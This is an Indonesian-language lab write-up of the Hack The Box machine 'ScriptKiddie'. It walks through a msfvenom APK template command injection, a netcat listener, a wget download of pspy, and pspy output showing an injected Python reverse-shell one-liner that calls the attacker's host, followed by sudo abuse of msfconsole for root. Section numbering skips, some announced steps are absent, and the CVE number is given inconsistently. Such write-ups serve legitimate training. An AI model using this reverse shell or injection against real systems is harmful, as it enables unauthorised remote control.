Pembuat mesin kali ini adalah 0xdf, sistem operasi yang digunakan adalah Linux dan tingkat kesulitan dari mesin adalah Easy. Mesin ini dirilis pada Februari 2021.

1. Enumeration#

Seperti biasa yang pertama kita lakukan adalah scanning seluruh port pada mesin target. Untuk scanning seluruh port dengan cepat kita bisa menggunakan masscan.

❯ sudo masscan -p1-65535,U:1-65535 10.10.10.226 --rate=1000 -e tun0

2. Port 5000 - k1d'5 h4ck3r t00l5#

Port 5000 adalah aplikasi web yang memiliki beberapa fitur seperti port scanning menggunakan nmap, generate binary shell payload (windows/linux/android) menggunakan msfvenom dan searchsploit.

2.1. nmap - Test command injection?#

  • Uji coba command injection sudah dilakukan, tetapi tidak berhasil.

2.2. msfvenom - Injection?#

ketika saya mencari tahu tentang msfvenom injection, saya menemukan sesuatu yang menarik:

CVE-2020-7384:

  • Rapid7 Metasploit Framework msfvenom APK Template Command Injection
  • Metasploit Framework 6.0.11 - msfvenom APK template command injection

Kerentanan ini memungkinkan kita mengekploitasi command injection pada Metasploit Frameworks msfvenom payload generator saat menggunakan file APK yang dibuat sebagai template payload Android.

Aset yang terdampak adalah Metasploit Framework <= 6.0.11 dan Metasploit Pro <= 4.18.0

3. Exploit CVE-2020-7385#

3.1. Upload APK#

Setelah malicious APK sudah berhasil dibuat, jadikan komputer kita menjadi listener:

❯ nc -lvnp 1337
listening on [any] 1337 ...

Selanjutnya, upload APK dan jangan lupa untuk men-set sistem operasi dan ip dari komputer kita.

3.2. Getting shell and user.txt#

Ketika APK berhasil ter-upload dan sistem memproses APK tersebut, kita akan mendapatkan reverse shell:

4.3. Found interesting file#

Terdapat file scanlosers.sh yang berisi script untuk melakukan port scanning. Dimana pada script tersebut memiliki inputan untuk IP target dari file hackers yang bisa dimodifikasi oleh user kid.

kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

kid@scriptkiddie:/home/pwn$ ls -lah /home/kid/logs/hackers
-rw-rw-r-- 1 kid pwn 0 May 28 15:44 /home/kid/logs/hackers

4.5. Find out what’s going on using pspy#

pspy adalah tool yang dirancang untuk mengintip proses yang sedang berjalan tanpa memerlukan izin root. Tool ini memungkinkan kita untuk melihat perintah yang dijalankan oleh pengguna lain, cron jobs, dll.

Download pspy ke dalam mesin target dan jalankan seperti berikut:

kid@scriptkiddie:/tmp$ wget http://10.10.14.19:8000/pspy64
kid@scriptkiddie:/tmp$ chmod +x pspy64
kid@scriptkiddie:/tmp$ ./pspy64

Terlihat di bawah ini terdapat proses port scanning yang telah kita inject sebelumnya untuk menjalankan perintah reverse shell.

2021/05/28 17:15:26 CMD: UID=1001 PID=102266 | sh -c nmap --top-ports 10 -oN recon/; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.19",1338));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'; #.nmap ; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.19",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'; # 2>&1 >/dev/null

5.2. Sudo abuse#

Terlihat di bawah ini, user pwn memiliki akses root untuk menjalankan metasploit.

pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole

Metasploit selain menggunakan perintahnya sendiri, ia juga menjalankan shell dari user yang digunakan.

Cukup menjalankan perintah seperti di bawah ini untuk menjalankan metasploit sebagai root dan jalankan perintah yang ingin dijalankan.

6. Closing - What I learned#

  1. Selalu cari tahu eksploitasi dari fitur yang disediakan.
  2. Gunakan pspy untuk melihat proses yang dijalankan oleh user lain.
